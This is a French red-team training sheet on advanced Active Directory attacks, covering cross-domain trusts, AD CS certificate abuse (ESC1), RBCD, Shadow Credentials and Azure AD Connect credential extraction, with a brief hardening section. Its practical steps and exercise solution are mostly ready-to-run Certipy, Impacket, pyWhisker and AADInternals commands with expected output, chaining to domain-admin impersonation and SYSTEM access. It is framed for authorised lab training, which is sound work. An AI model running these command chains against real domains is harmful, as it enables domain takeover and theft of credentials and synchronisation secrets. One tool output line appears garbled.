---
tags:
  - Cybersécurité
  - Avancé
  - Pratique
description: "Sécurité Active Directory avancée : cross-forest, AD CS, Shadow Credentials, Azure AD / Entra ID et hardening"
estimated_time: "65 min"
fiche_number: 4
total_fiches: 4
cursus: "Phase 7 - Red Team Avancé"
---

# 04 - Sécurité Active Directory - Avancée

> **En bref** : À la fin de cette fiche, tu sauras exploiter les relations de confiance inter-forêts et inter-domaines, attaquer les services de certificats AD CS (vulnérabilités ESC1 à ESC8), utiliser les Shadow Credentials et l'abus RBCD pour la persistance, attaquer les environnements Azure AD / Entra ID hybrides, et mettre en place un hardening avancé avec le modèle de tiering et les PAW. Lecture estimée : 65 min.

!!! warning "Cadre légal : lab et autorisation uniquement"
    Les techniques AD avancées (AD CS, Shadow Credentials, cross-forest, Entra ID) ne doivent être pratiquées **que** dans un lab que tu contrôles ou un engagement avec **autorisation écrite**. Tester un domaine ou un tenant tiers sans autorisation est illégal en France (Code pénal, art. 323-1 et s.). Ce wiki n'est **pas** une autorisation d'attaque.

## Prérequis

- [Active Directory - Attaque et Sécurisation](../04-specialisation-offensive/03-active-directory.md) (Phase 4, fiche 03)
- [Red Team Operations](01-red-team-operations.md) (fiche 01 de cette phase)
- Connaissances solides en Active Directory : domaines, forêts, GPO, Kerberos, NTLM
- Expérience pratique avec BloodHound, Mimikatz, Rubeus et Impacket
- Compréhension des protocoles d'authentification Kerberos et NTLM

## Objectif de cette fiche

À la fin de cette fiche, tu sauras exploiter les relations de confiance inter-forêts et inter-domaines, attaquer les services de certificats AD CS (vulnérabilités ESC1 à ESC8), utiliser les Shadow Credentials et l'abus RBCD pour la persistance, attaquer les environnements Azure AD / Entra ID hybrides, et mettre en place un hardening avancé avec le modèle de tiering et les PAW.

---

## Concepts

Cette section explique tous les concepts nécessaires. Lis-la entièrement avant de passer aux étapes pratiques.

### Qu'est-ce que la confiance inter-forêts et inter-domaines ?

**Définition** : Les relations de confiance (trusts) sont des liens entre domaines ou forêts Active Directory qui permettent aux utilisateurs d'un domaine d'accéder aux ressources d'un autre domaine. Ces relations sont essentielles dans les grandes organisations qui ont plusieurs domaines AD.

**Le problème que l'abus des trusts résout (point de vue offensif)** :

Sans exploitation des trusts, voici les limites rencontrées :

1. **Cloisonnement** : l'attaquant qui compromet un domaine est limité à ce domaine
2. **Accès restreint** : les ressources critiques peuvent se trouver dans un autre domaine ou une autre forêt
3. **Isolation supposée** : l'organisation pense que ses forêts séparées sont isolées

**Comment l'abus des trusts résout ces problèmes** :

| Problème | Solution |
| -------- | -------- |
| Cloisonnement | Le trust abuse permet de pivoter d'un domaine à un autre |
| Accès restreint | L'attaquant accède aux ressources du domaine de confiance |
| Isolation supposée | Les forêts ne sont pas toujours aussi isolées que prévu (SID History, constrained délégation) |

**Types de relations de confiance** :

| Type | Direction | Portée | Risque |
| ---- | --------- | ------ | ------ |
| Parent-Child | Bidirectionnel automatique | Entre un domaine parent et enfant | Élevé : trust automatique, pas de filtrage SID par défaut |
| Tree-Root | Bidirectionnel automatique | Entre les racines des arbres d'une forêt | Élevé : même principe que parent-child |
| Forest (External) | Uni ou bidirectionnel | Entre deux forêts distinctes | Moyen : SID filtering activé par défaut |
| Shortcut | Bidirectionnel | Raccourci entre deux domaines enfants | Moyen : optimisation, mêmes risques que parent-child |
| Realm | Uni ou bidirectionnel | Vers un domaine Kerberos non-Windows | Variable |

**Techniques d'abus des trusts** :

**SID History injection** (intra-forêt) :

Le SID History est un attribut qui stocke les anciens SID d'un utilisateur (par exemple après une migration). Un attaquant avec les droits Domain Admin peut injecter le SID de l'Enterprise Admin dans le SID History d'un utilisateur, obtenant ainsi les droits sur toute la forêt.

**Golden Ticket inter-domaine** :

Avec le hash NTLM du compte `krbtgt` d'un domaine enfant, l'attaquant crée un Golden Ticket avec un SID History contenant le SID du groupe Enterprise Admins du domaine racine.

**Constrained/Unconstrained délégation cross-domain** :

Si un service a la délégation non contrainte (Unconstrained Délégation) et est accessible depuis un domaine de confiance, un attaquant peut capturer le TGT d'un utilisateur du domaine de confiance.

**Analogie concrète** : Les relations de confiance sont comme des accords diplomatiques entre pays. Un accord permet aux citoyens d'un pays A de voyager au pays B. Si un imposteur obtient un faux passeport du pays A (Golden Ticket), il peut entrer au pays B en utilisant l'accord (trust). Le SID History injection est comme ajouter un faux visa diplomatique (Enterprise Admin) sur un passeport existant.

**Ce que les trusts ne sont PAS** :

- Les trusts ne sont pas des connexions réseau. Un trust est une relation logique Kerberos/NTLM. La connectivité réseau est un prérequis séparé.
- Les trusts inter-forêts ne sont pas identiques aux trusts intra-forêt. Le SID filtering est activé par défaut entre forêts, ce qui bloque le SID History injection direct.

---

### Qu'est-ce que AD CS et ses vulnérabilités ?

**Définition** : AD CS (Active Directory Certificate Services) est le service Microsoft qui gère l'infrastructure de clés publiques (PKI) dans un environnement AD. Il émet des certificats numériques utilisés pour l'authentification, le chiffrement et la signature.

**Le problème que l'abus d'AD CS résout (point de vue offensif)** :

Sans exploitation d'AD CS, voici les limites rencontrées :

1. **Besoin de mots de passe** : les attaques classiques nécessitent de voler des mots de passe ou des hash
2. **Détection du vol de credentials** : les outils comme Mimikatz sont très surveillés par les EDR
3. **Persistance limitée** : les mots de passe changent, les tickets Kerberos expirent

**Comment l'abus d'AD CS résout ces problèmes** :

| Problème | Solution |
| -------- | -------- |
| Besoin de mots de passe | Un certificat permet de s'authentifier sans connaître le mot de passe |
| Détection du vol de credentials | La demande de certificat est une opération légitime, peu surveillée |
| Persistance limitée | Les certificats ont une durée de validité longue (1 an ou plus par défaut) |

**Vulnérabilités AD CS (ESC1 à ESC8)** :

| ESC | Nom | Description | Impact |
| --- | --- | ----------- | ------ |
| ESC1 | Misconfigured Certificate Templates | Le template permet à un utilisateur de spécifier un SAN (Subject Alternative Name) arbitraire | Un utilisateur peut demander un certificat au nom de n'importe quel autre utilisateur (y compris Domain Admin) |
| ESC2 | Misconfigured Certificate Templates | Le template a un EKU (Extended Key Usage) trop permissif (Any Purpose ou SubCA) | Le certificat peut être utilisé pour n'importe quelle opération, y compris l'authentification client |
| ESC3 | Enrollment Agent Templates | Le template permet de demander des certificats au nom d'autres utilisateurs | L'attaquant agit comme agent d'inscription et émet des certificats pour d'autres comptes |
| ESC4 | Vulnérable Certificate Template ACL | Les ACL du template permettent à un utilisateur de modifier le template | L'attaquant rend le template vulnérable à ESC1, puis l'exploite |
| ESC5 | Vulnérable PKI Object ACL | Les ACL des objets PKI (CA, NTAuthCertificates) sont trop permissives | L'attaquant modifie la configuration de la CA |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 | Le flag EDITF est activé sur la CA, permettant le SAN dans toute requête | Même impact que ESC1, mais sur n'importe quel template |
| ESC7 | Vulnérable CA ACL | Un utilisateur a les droits ManageCA ou ManageCertificates sur la CA | L'attaquant approuve des requêtes en attente ou modifie la configuration |
| ESC8 | NTLM Relay to AD CS | Le service web d'inscription (HTTP) accepte l'authentification NTLM | L'attaquant relaye l'authentification NTLM d'un compte machine vers la CA |

**Analogie concrète** : AD CS est comme un bureau qui délivre des cartes d'identité. ESC1 signifie que le formulaire de demande permet d'écrire le nom de quelqu'un d'autre. ESC6 signifie que le bureau accepte d'ajouter un alias sur n'importe quelle carte. ESC8 signifie que le bureau accepte une demande par téléphone sans vérifier l'identité de l'appelant.

---

### Qu'est-ce que les Shadow Credentials ?

**Définition** : Les Shadow Credentials sont une technique de persistance qui exploite l'attribut `msDS-KeyCredentialLink` d'un objet AD. En ajoutant une clé publique à cet attribut, l'attaquant peut s'authentifier en tant que l'utilisateur ou la machine cible sans connaître son mot de passe, via le protocole PKINIT (pré-authentification Kerberos avec certificat).

**Le problème que les Shadow Credentials résolvent** :

Sans Shadow Credentials, voici les limites rencontrées :

1. **Persistance détectable** : les techniques classiques (DCSync, Golden Ticket) laissent des traces connues
2. **Changement de mot de passe** : si le mot de passe de la cible change, l'accès est perdu
3. **Monitoring des modifications** : les changements de mot de passe et les créations de comptes sont surveillés

**Comment les Shadow Credentials résolvent ces problèmes** :

| Problème | Solution |
| -------- | -------- |
| Persistance détectable | L'attribut `msDS-KeyCredentialLink` est rarement surveillé |
| Changement de mot de passe | La clé publique reste valide même après un changement de mot de passe |
| Monitoring des modifications | L'ajout d'une clé dans cet attribut ne déclenche pas les alertes classiques |

---

### Qu'est-ce que l'abus RBCD ?

**Définition** : RBCD (Resource-Based Constrained Délégation) est un mécanisme Kerberos qui permet à un service de s'authentifier auprès d'un autre service au nom d'un utilisateur. L'abus de RBCD exploite le fait que l'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` peut être modifié par quiconque a les droits d'écriture sur l'objet machine cible.

**Le problème que l'abus RBCD résout** :

Sans RBCD abuse, voici les limites rencontrées :

1. **Délégation classique nécessite des droits élevés** : configurer la constrained délégation classique nécessite les droits Domain Admin
2. **Pas d'impersonation** : sans délégation, l'attaquant ne peut pas s'authentifier en tant qu'un autre utilisateur auprès d'un service
3. **Cibles limitées** : sans délégation, l'attaquant ne peut pas accéder aux services protégés sur la machine cible

**Comment l'abus RBCD résout ces problèmes** :

| Problème | Solution |
| -------- | -------- |
| Droits élevés nécessaires | RBCD peut être configuré par quiconque a les droits d'écriture sur la machine cible (souvent le créateur de l'objet machine) |
| Pas d'impersonation | L'attaquant utilise S4U2Self et S4U2Proxy pour obtenir un ticket de service au nom d'un admin |
| Cibles limitées | RBCD permet d'accéder à n'importe quel service sur la machine cible (CIFS, HTTP, etc.) |

---

### Qu'est-ce que Azure AD / Entra ID ?

**Définition** : Azure AD (renommé Microsoft Entra ID en 2023) est le service d'identité cloud de Microsoft. Dans les environnements hybrides, Azure AD est synchronisé avec l'Active Directory on-premises via Azure AD Connect. Les attaquants ciblent cette synchronisation pour pivoter entre le cloud et l'on-premises.

**Le problème que l'attaque d'Azure AD résout** :

Sans exploitation d'Azure AD, voici les limites rencontrées :

1. **Périmètre limité à l'on-premises** : l'attaquant n'accède qu'au réseau interne
2. **Données dans le cloud** : les emails (Exchange Online), fichiers (SharePoint/OneDrive) et données métier (SaaS) sont dans le cloud
3. **Pas de persistance cloud** : même avec un accès Domain Admin on-premises, le cloud reste distinct

**Comment l'attaque d'Azure AD résout ces problèmes** :

| Problème | Solution |
| -------- | -------- |
| Périmètre limité | L'accès à Azure AD ouvre l'accès aux services cloud (Microsoft 365, Azure) |
| Données dans le cloud | Le vol de tokens permet d'accéder aux emails, fichiers, Teams |
| Pas de persistance cloud | Le PRT (Primary Refresh Token) et les app registrations fournissent une persistance durable |

**Techniques d'attaque Azure AD / Entra ID** :

| Technique | Description | Prérequis |
| --------- | ----------- | --------- |
| PRT Theft | Vol du Primary Refresh Token (équivalent du TGT pour Azure AD) | Accès à une machine avec une session Azure AD active |
| Token Theft | Interception des tokens OAuth2 (access tokens, refresh tokens) | Accès au navigateur, phishing, ou compromission de la machine |
| Azure AD Connect Abuse | Extraction des credentials du compte de synchronisation | Accès au serveur Azure AD Connect |
| Conditional Access Bypass | Contournement des politiques d'accès conditionnel (IP, device, MFA) | Compréhension des politiques configurées |
| App Registration Abuse | Création ou modification d'app registrations avec des permissions élevées | Droits suffisants dans Azure AD (Application Admin) |
| Consent Grant Attack | Obtenir des permissions OAuth2 via le consentement de l'utilisateur (phishing) | Ingénierie sociale |

**Outils pour Azure AD / Entra ID** :

| Outil | Rôle | Langage |
| ----- | ---- | ------- |
| ROADtools | Énumération et exploration d'Azure AD | Python |
| AADInternals | Administration et attaque d'Azure AD/Entra ID | PowerShell |
| TokenTacticsV2 | Manipulation de tokens OAuth2 et PRT | PowerShell |
| AzureHound | Collecte de données Azure AD pour BloodHound | Go |
| GraphRunner | Interaction avec Microsoft Graph API post-compromission | PowerShell |

---

### Qu'est-ce que le hardening avancé AD ?

**Définition** : Le hardening avancé AD regroupe les mesures de sécurisation qui vont au-delà des bonnes pratiques de base. Il inclut le modèle de tiering, les PAW (Privileged Access Workstations), le monitoring des modifications sensibles et la protection des comptes privilégiés.

**Le modèle de tiering** :

Le modèle de tiering (niveaux) segmente l'environnement AD en trois niveaux pour limiter le mouvement latéral :

| Tier | Contenu | Exemples |
| ---- | ------- | -------- |
| Tier 0 | Identité et contrôle AD | Contrôleurs de domaine, AD CS, Azure AD Connect, comptes Domain Admins |
| Tier 1 | Serveurs et applications | Serveurs applicatifs, bases de données, serveurs de fichiers |
| Tier 2 | Postes de travail et utilisateurs | Ordinateurs des employés, comptes utilisateurs standards |

**Règles du tiering** :

- Un admin Tier 0 ne se connecte **jamais** sur un poste Tier 2
- Un admin Tier 1 ne se connecte **jamais** sur un poste Tier 2 avec ses credentials Tier 1
- Les credentials d'un tier supérieur ne transitent **jamais** par un tier inférieur
- Chaque admin a un compte séparé par tier

**PAW (Privileged Access Workstation)** :

Un PAW est un poste de travail durci, dédié exclusivement à l'administration des systèmes critiques :

- Aucune navigation internet
- Aucun email
- Aucune application non essentielle
- Réseau isolé, accès uniquement aux systèmes à administrer
- Logs et monitoring renforcés

---

## Étapes Pratiques

### Étape 1 : Énumérer les relations de confiance AD

Depuis une machine Windows compromise, collecter les données avec SharpHound :

```powershell
# Collecter les données avec SharpHound
.\SharpHound.exe --collectionmethods All,GPOLocalGroup --domain corp.local
```

Ou avec la version Python (depuis Linux avec un accès réseau) :

```bash
bloodhound-python -d corp.local -u utilisateur -p motdepasse -ns 10.0.0.1 -c all
```

**Résultat attendu** :

```text
Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, DCOM, PSRemote, GPOLocalGroup
Starting enumeration for corp.local
[*] Done in 00M 42S, compressing results
[*] Compressing 9 files into 20240115_BloodHound.zip
```

Pour identifier les trusts avec la commande native Windows :

```powershell
# Depuis un PowerShell sur une machine du domaine
nltest /domain_trusts /all_trusts
```

**Résultat attendu** :

```text
List of domain trusts:
    0: CORP corp.local (NT 5) (Forest Tree Root) (Primary Domain) (Native)
    1: DEV dev.corp.local (NT 5) (Forest: 0) (Direct Outbound) (Direct Inbound)
    2: PARTNER partner.com (NT 5) (Forest) (Direct Outbound) (Attr: foresttransitive)
```

---

### Étape 2 : Exploiter AD CS (ESC1) avec Certipy

```bash
# Installer Certipy (outil Python pour attaquer AD CS)
pip3 install certipy-ad

# Étape 1 : Trouver les templates vulnérables
certipy find -u utilisateur@corp.local -p motdepasse -dc-ip 10.0.0.1 -vulnerable

# Étape 2 : Exploiter ESC1 (demander un certificat au nom du Domain Admin)
certipy req -u utilisateur@corp.local -p motdepasse -dc-ip 10.0.0.1 \
    -ca CORP-CA \
    -template VulnerableTemplate \
    -upn administrator@corp.local
```

**Résultat attendu** :

```text
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 42
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

```bash
# Étape 3 : S'authentifier avec le certificat
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

**Résultat attendu** :

```text
[*] Using principal: administrator@corp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

---

### Étape 3 : Abus RBCD pour élévation de privilèges

```bash
# Prérequis : avoir les droits d'écriture sur un objet machine (ou pouvoir créer un objet machine)
# Par défaut, tout utilisateur authentifié peut ajouter jusqu'à 10 machines dans le domaine (ms-DS-MachineAccountQuota)

# Étape 1 : Créer un compte machine contrôlé par l'attaquant
impacket-addcomputer -computer-name 'EVILPC$' -computer-pass 'Password123!' \
    -dc-ip 10.0.0.1 corp.local/utilisateur:motdepasse

# Étape 2 : Configurer RBCD sur la machine cible
# Cela indique que EVILPC$ peut agir au nom de n'importe quel utilisateur sur TARGET$
impacket-rbcd -delegate-from 'EVILPC$' -delegate-to 'TARGET$' -action write \
    -dc-ip 10.0.0.1 corp.local/utilisateur:motdepasse

# Étape 3 : Obtenir un ticket de service en tant qu'administrateur
impacket-getST -spn 'cifs/target.corp.local' -impersonate 'administrator' \
    -dc-ip 10.0.0.1 corp.local/'EVILPC$':'Password123!'
```

**Résultat attendu** :

```text
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_target.corp.local@CORP.LOCAL.ccache
```

```bash
# Étape 4 : Utiliser le ticket pour accéder à la machine cible
export KRB5CCNAME=administrator@cifs_target.corp.local@CORP.LOCAL.ccache
impacket-psexec -k -no-pass target.corp.local
```

---

### Étape 4 : Shadow Credentials avec Whisker ou pyWhisker

```bash
# Avec pyWhisker (version Python)
pip3 install pywhisker

# Ajouter une Shadow Credential sur le compte cible
# Prérequis : droits d'écriture sur l'attribut msDS-KeyCredentialLink de la cible
pywhisker -d corp.local -u utilisateur -p motdepasse \
    --target administrateur --action add --dc-ip 10.0.0.1
```

**Résultat attendu** :

```text
[*] Searching for the target account
[*] Target user found: CN=Administrateur,CN=Users,DC=corp,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: a1b2c3d4-e5f6-7890-abcd-ef1234567890
[*] Updating the msDS-KeyCredentialLink attribute of administrateur
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Saved PFX (#PKCS12) certificate & key at path: a1b2c3d4.pfx
[*] Must be googled with the password: randompassword123
```

```bash
# S'authentifier avec le certificat généré
certipy auth -pfx a1b2c3d4.pfx -dc-ip 10.0.0.1 -domain corp.local -username administrateur
```

---

### Étape 5 : Énumérer Azure AD / Entra ID avec ROADtools

```bash
# Installer ROADrecon (paquet PyPI du projet ROADtools)
pip3 install roadrecon

# Authentification (avec des credentials volées)
roadrecon auth -u utilisateur@corp.onmicrosoft.com -p motdepasse

# Collecter les données d'Azure AD
roadrecon gather

# Lancer l'interface web pour explorer les données
roadrecon gui
```

**Résultat attendu** :

```text
[*] Authenticating to Azure AD
[*] Token obtained for user utilisateur@corp.onmicrosoft.com
[*] Gathering Azure AD data...
[*] Users: 1523
[*] Groups: 342
[*] Applications: 89
[*] Service Principals: 156
[*] Devices: 2341
[*] Starting GUI on http://127.0.0.1:5000
```

---

### Étape 6 : Extraire les credentials Azure AD Connect

```powershell
# Sur le serveur Azure AD Connect (accès admin local requis)
# Utiliser AADInternals (PowerShell)
Install-Module AADInternals -Force
Import-Module AADInternals

# Extraire les credentials du compte de synchronisation
Get-AADIntSyncCredentials
```

**Résultat attendu** :

```text
Name                           Value
----                           -----
ADDomain                       corp.local
ADUser                         MSOL_abc1234567890
ADUserPassword                 R@nd0mP@ssw0rd!2024
AADUser                        Sync_SERVER_abc123@corp.onmicrosoft.com
AADUserPassword                AnotherR@nd0mP@ss!
```

Le compte `MSOL_*` a des droits de réplication sur l'AD, ce qui permet d'effectuer un DCSync et d'extraire tous les hash du domaine.

---

## Commandes Utiles

| Commande | Action |
| -------- | ------ |
| `certipy find -vulnerable -u USER -p PASS -dc-ip IP` | Trouver les templates AD CS vulnérables |
| `certipy req -ca CA -template TPL -upn TARGET` | Demander un certificat au nom d'un autre utilisateur (ESC1) |
| `certipy auth -pfx CERT.pfx -dc-ip IP` | S'authentifier avec un certificat |
| `impacket-addcomputer -computer-name 'PC$' -computer-pass PASS` | Créer un compte machine |
| `impacket-rbcd -delegate-from 'PC$' -delegate-to 'TARGET$' -action write` | Configurer RBCD |
| `impacket-getST -spn 'cifs/target' -impersonate admin` | Obtenir un ticket de service via S4U |
| `pywhisker --target USER --action add` | Ajouter une Shadow Credential |
| `nltest /domain_trusts /all_trusts` | Lister les relations de confiance |
| `roadrecon auth -u USER -p PASS` | S'authentifier auprès d'Azure AD |
| `roadrecon gather` | Collecter les données Azure AD |
| `Get-AADIntSyncCredentials` | Extraire les credentials Azure AD Connect |
| `bloodhound-python -c all -d DOMAIN` | Collecter les données AD pour BloodHound |

---

## Pièges Fréquents

### Piège 1 : Confondre trust intra-forêt et inter-forêt

⚠️ **Problème** : Tenter un SID History injection entre deux forêts distinctes. Le SID filtering est activé par défaut entre forêts, ce qui filtre les SID étrangers dans le SID History.

✅ **Solution** : Le SID History injection fonctionne entre domaines d'une même forêt (parent-child, tree-root). Entre forêts, il faut d'autres techniques : exploitation de la constrained délégation cross-forest, ou recherche de comptes avec des droits dans les deux forêts.

---

### Piège 2 : Oublier de vérifier ms-DS-MachineAccountQuota

⚠️ **Problème** : Essayer de créer un compte machine pour l'abus RBCD alors que la valeur de `ms-DS-MachineAccountQuota` est à 0 (l'administrateur a durci ce paramètre).

✅ **Solution** : Vérifier la valeur avant de tenter l'attaque. Si elle est à 0, chercher un autre vecteur : un compte machine existant dont tu as le mot de passe, ou utiliser un compte machine compromis par une autre technique.

```bash
# Vérifier la valeur de MachineAccountQuota
python3 -c "
from ldap3 import *
s = Server('10.0.0.1')
c = Connection(s, 'corp.local\\\\utilisateur', 'motdepasse', auto_bind=True)
c.search('DC=corp,DC=local', '(objectClass=domain)', attributes=['ms-DS-MachineAccountQuota'])
print(c.entries[0]['ms-DS-MachineAccountQuota'])
"
```

---

### Piège 3 : Ignorer la détection des attaques AD CS

⚠️ **Problème** : Penser que les attaques AD CS sont indétectables. Les événements Windows 4886 (Certificate Services received a certificate request) et 4887 (Certificate Services approved a certificate request) sont enregistrés.

✅ **Solution** : Lors d'un exercice red team, noter que les attaques AD CS laissent des traces dans les logs de la CA. En purple team, vérifier que ces événements sont collectés par le SIEM et que des alertes sont configurées pour les demandes de certificats avec un SAN qui ne correspond pas au demandeur.

---

### Piège 4 : Ne pas comprendre la synchronisation Azure AD Connect

⚠️ **Problème** : Penser que compromettre Azure AD donne automatiquement accès à l'AD on-premises, ou inversement. La synchronisation est unidirectionnelle par défaut (AD -> Azure AD) pour les mots de passe.

✅ **Solution** : Comprendre le flux de synchronisation. Le Password Hash Sync (PHS) envoie les hash de l'AD vers Azure AD. L'Azure AD Connect a un compte avec des droits de réplication dans l'AD. Compromettre le serveur Azure AD Connect donne accès aux deux côtés (cloud et on-premises).

---

### Piège 5 : Utiliser Certipy sans vérifier les prérequis du template

⚠️ **Problème** : Certipy signale un template comme vulnérable, mais l'exploitation échoue car l'utilisateur n'a pas les droits d'inscription (Enroll) sur le template.

✅ **Solution** : Vérifier les trois conditions nécessaires pour ESC1 : (1) le template autorise le SAN, (2) l'utilisateur a le droit d'inscription, (3) le template permet l'authentification client (EKU). Utiliser `certipy find -vulnerable` qui vérifie ces conditions, mais vérifier manuellement en cas de doute.

---

## Checklist de Validation

- [ ] Je sais expliquer les types de relations de confiance AD (parent-child, forest, shortcut)
- [ ] Je comprends le SID History injection et ses limites (SID filtering entre forêts)
- [ ] Je peux énumérer les templates AD CS vulnérables avec Certipy
- [ ] Je sais exploiter ESC1 pour obtenir un certificat au nom d'un Domain Admin
- [ ] Je comprends le mécanisme RBCD et ses prérequis (droits d'écriture, compte machine)
- [ ] Je sais ajouter une Shadow Credential avec pyWhisker
- [ ] Je connais les techniques d'attaque Azure AD (PRT theft, Azure AD Connect)
- [ ] Je sais utiliser ROADtools pour énumérer un tenant Azure AD
- [ ] Je comprends le modèle de tiering (Tier 0, 1, 2) et son objectif
- [ ] Je sais ce qu'est un PAW et pourquoi il est nécessaire

---

## Exercice Pratique

**Énoncé** : Dans un lab AD avec deux domaines (parent et enfant), exploite AD CS pour obtenir un accès Domain Admin, puis utilise le RBCD abuse pour pivoter vers un serveur cible.

**Indications** :

- Commence par énumérer les templates AD CS vulnérables avec `certipy find -vulnerable`
- Identifie un template ESC1 exploitable
- Demande un certificat au nom du Domain Admin avec `certipy req`
- Authentifie-toi avec le certificat pour obtenir le hash NT du Domain Admin
- Crée un compte machine pour l'abus RBCD
- Configure RBCD sur le serveur cible
- Obtiens un ticket de service avec `impacket-getST`
- Accède au serveur cible avec `impacket-psexec`

**Résultat attendu** : Un accès SYSTEM sur le serveur cible, obtenu via une chaîne d'attaques AD CS + RBCD.

---

## Solution de l'Exercice

> **Note** : Cette section contient la solution complète. Essaie d'abord de résoudre l'exercice par toi-même avant de consulter cette solution.

---

**Étape 1 : Énumérer les templates vulnérables**

```bash
# Trouver les templates AD CS vulnérables
certipy find -u utilisateur@child.corp.local -p motdepasse -dc-ip 10.0.0.2 -vulnerable
```

Le résultat montre un template "WebServer" avec les conditions ESC1 remplies.

**Étape 2 : Exploiter ESC1**

```bash
# Demander un certificat au nom du Domain Admin du domaine parent
certipy req -u utilisateur@child.corp.local -p motdepasse \
    -dc-ip 10.0.0.2 \
    -ca CORP-CA \
    -template WebServer \
    -upn administrator@corp.local
```

**Étape 3 : S'authentifier avec le certificat**

```bash
# Obtenir le hash NT du Domain Admin
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1 -domain corp.local
```

**Étape 4 : RBCD abuse**

```bash
# Créer un compte machine
impacket-addcomputer -computer-name 'ATTACKPC$' -computer-pass 'P@ssw0rd!' \
    -dc-ip 10.0.0.1 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/administrator

# Configurer RBCD sur le serveur cible
impacket-rbcd -delegate-from 'ATTACKPC$' -delegate-to 'FILESRV$' -action write \
    -dc-ip 10.0.0.1 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/administrator

# Obtenir le ticket de service
impacket-getST -spn 'cifs/filesrv.corp.local' -impersonate 'administrator' \
    -dc-ip 10.0.0.1 corp.local/'ATTACKPC$':'P@ssw0rd!'

# Accéder au serveur
export KRB5CCNAME=administrator@cifs_filesrv.corp.local@CORP.LOCAL.ccache
impacket-psexec -k -no-pass filesrv.corp.local
```

**Résultat attendu** :

```text
Microsoft Windows [Version 10.0.20348.2340]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
FILESRV
```

---

## Navigation

← Fiche précédente : **[03 - Exploit Development](03-exploit-development.md)**
